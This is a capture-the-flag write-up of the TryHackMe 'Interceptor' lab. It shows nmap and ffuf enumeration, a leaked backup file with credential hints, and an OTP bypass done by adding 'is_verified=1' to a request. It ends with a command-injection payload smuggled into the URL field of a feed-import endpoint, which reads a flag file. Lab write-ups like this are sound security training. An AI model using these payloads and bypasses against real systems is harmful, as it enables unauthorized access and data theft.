# TryHackMe Interceptor Write-up

<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/5dcaa545-3309-42e3-920e-b774cc2baa0d" />

Use Burp or interception knowledge to modify the traffic and pwn the machine.


# Target Information

| IP Address  | Hostname     |
| ----------- | ------------ |
| 10.49.185.8 | mediahub.thm |

---

# Initial Reconnaissance

## Nmap Scan

Started with a service and version detection scan.

```bash id="mq9q1z"
nmap -sC -sV -O mediahub.thm
```

## Results

```text id="jlwmgz"
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
53/tcp open  domain  ISC BIND 9.16.1
80/tcp open  http    Apache httpd 2.4.41
```

## Observations

* SSH service was available but no credentials were known.
* DNS service was exposed on port 53.
* Apache web server hosted the `MediaHub` application.
* PHP session cookie lacked the `HttpOnly` flag.

---

# Web Enumeration

Performed directory enumeration against the web server.

```bash id="6a7o9u"
ffuf -u http://mediahub.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

## Interesting Endpoints

```text id="m5v7mf"
/login.php
/login.php.bak
/search.php
/config.php
/dashboard.php
/otp.php
/phpmyadmin
/uploads
```

---

# Login Portal Analysis

## Initial Attempts

Tested several common attack vectors against `/login.php`:

* Default credentials
* Authentication bypass payloads
* SQL injection

None were successful.

---

# Backup File Disclosure

Discovered a backup file:

```text id="mwk2gm"
/login.php.bak
```

Inspecting the file revealed developer comments containing staging credentials.

```php id="wrf9xg"
/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: [ REDACTED ]
|
| Password policy reminder:
| Admin password follows company format:
| [ REDACTED ]
|
| TODO: remove before production deployment
*/
```

Successfully authenticated to the application by using the credentials above.

---

# OTP Bypass

After login, the application redirected to:

```text id="v38m7g"
/otp.php
```

## Observations

* OTP required exactly 6 digits.
* No visible rate limiting or lockout mechanism.
* Brute force was possible but unnecessary.

The OTP form submitted requests to:

```text id="gk1q4p"
/verify_otp.php
```

## Original Request

```http id="8k8n5n"
POST /verify_otp.php HTTP/1.1

otp=213456
```

## Response

```json id="5yw7l9"
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

Noticed the application relied on the `is_verified` parameter in the JSON response.

Modified the request manually:

```http id="h6l8s0"
POST /verify_otp.php HTTP/1.1

otp=213456&is_verified=1
```

This bypassed the OTP validation entirely and granted access to `dashboard.php`.

---

# Dashboard Access

After bypassing OTP validation, access to the admin dashboard was obtained.

A flag was visible at the top of the page:

```text id="1f4x4l"
THM{REDACTED}
```

## Additional Features

The dashboard contained:

* File upload functionality
* Feed import functionality

Initial testing suggested:

* Upload validation was weak
* The feed import feature was vulnerable to SSRF and command injection

---

# SSRF and Command Injection

## Vulnerable Endpoint

```text id="u4c4xq"
/import_feed_api.php
```

The application accepted a URL parameter and internally executed a `curl` command.

---

# Normal Request

```http id="2ldjny"
POST /import_feed_api.php HTTP/1.1
Host: mediahub.thm
Content-Type: application/x-www-form-urlencoded

url=http://example.com
```

## Response

```json id="i2m39o"
{
  "ok": false,
  "error": "Internet not connected",
  "cmd_output": "curl: (28) Connection timed out after 4001 milliseconds"
}
```

## Analysis

Important observations:

* `localhost` and `127.0.0.1` were blocked.
* Only domains were accepted.
* User-controlled input was passed directly into a shell command.
* Command output was reflected in the JSON response.

This strongly indicated command injection.

---

# Command Injection Exploitation

Crafted a payload using shell command substitution.

## Exploit Request

```http id="bq7v8m"
POST /import_feed_api.php HTTP/1.1
Host: mediahub.thm
Content-Type: application/x-www-form-urlencoded

url=http://example.com%3b+$(cat+/var/www/user.txt)
```

Decoded payload:

```bash id="z1c7bp"
http://example.com; $(cat /var/www/user.txt)
```

---

# Retrieving the Flag

The application attempted to execute the injected command.

## Response

```json id="n9mdrz"
{
  "ok": false,
  "error": "Internet not connected",
  "cmd_output": "curl: (6) Could not resolve host: THM{REDACTED}"
}
```

The flag appeared at the bottom of the command output.

---

# Vulnerabilities Identified

## Sensitive Backup File Exposure

* Accessible `.bak` file exposed developer notes and credential hints.

## Weak Credential Policy

* Predictable password format enabled easy guessing.

## OTP Authentication Bypass

* Client-controlled `is_verified` parameter trusted by the backend.

## Command Injection

* Unsanitized user input passed directly into a shell command.

## SSRF

* Server-side requests allowed attacker-controlled URLs.

---

# Attack Path Summary

1. Enumerated services with Nmap.
2. Performed web content discovery.
3. Found exposed backup file `/login.php.bak`.
4. Extracted admin credential pattern.
5. Logged in using predictable credentials.
6. Bypassed OTP validation by manipulating `is_verified`.
7. Accessed the admin dashboard.
8. Identified SSRF and command injection in `/import_feed_api.php`.
9. Exploited command injection to read the user flag.

---
